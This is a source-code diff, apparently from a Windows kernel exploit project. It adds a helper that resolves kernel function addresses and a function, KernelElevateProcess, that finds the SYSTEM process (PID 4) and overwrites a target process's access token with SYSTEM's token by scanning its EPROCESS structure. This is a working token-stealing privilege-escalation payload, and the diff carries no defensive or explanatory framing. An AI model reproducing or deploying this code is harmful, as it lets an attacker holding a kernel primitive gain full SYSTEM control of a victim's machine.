@@ -227,7 +227,7 @@ typedef struct _SYSTEM_PROCESS_INFO
 
 typedef NTSTATUS(NTAPI* _PsLookupProcessByProcessId)(
 	HANDLE                  ProcessId,
-	SYSTEM_PROCESS_INFO*    Process
+	PVOID                   Process // SYSTEM_PROCESS_INFO
 );
 typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
 	SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -246,6 +246,22 @@ _PsReferencePrimaryToken PsReferencePrimaryToken = NULL;
 void* GetKernelFunction(HMODULE kernel, void* kernelBase, const char* name)
 {
 	return PVOID((uint64_t)kernelBase + (uint64_t)GetProcAddress(kernel, name) - (uint64_t)kernel);
+}
+
+void ReplaceMember(PDWORD_PTR pStruct, DWORD_PTR currentValue, DWORD_PTR newValue)
+{
+	DWORD_PTR mask = ~(sizeof(DWORD_PTR) == sizeof(DWORD) ? 7 : 0xf);
+
+	DWORD_PTR i = 0;
+	while(true)
+	{
+		if (((pStruct[i] ^ currentValue) & mask) == 0)
+		{
+			pStruct[i] = newValue;
+			break;
+		}
+		i++;
+	}
 }
 
 bool InitializeKernel()
@@ -285,4 +301,16 @@ bool InitializeKernel()
 	}
 
 	return false;
+}
+
+bool KernelElevateProcess(int processId)
+{
+	PVOID systemProcessInfo;
+	PVOID currentProcessInfo;
+	PsLookupProcessByProcessId((HANDLE)4, &systemProcessInfo);
+	PsLookupProcessByProcessId((HANDLE)processId, &currentProcessInfo);
+	PACCESS_TOKEN currentToken = PsReferencePrimaryToken(currentProcessInfo);
+	PACCESS_TOKEN systemToken = PsReferencePrimaryToken(systemProcessInfo);
+	ReplaceMember((PDWORD_PTR)currentProcessInfo, (DWORD_PTR)currentToken, (DWORD_PTR)systemToken);
+	return true;
 }
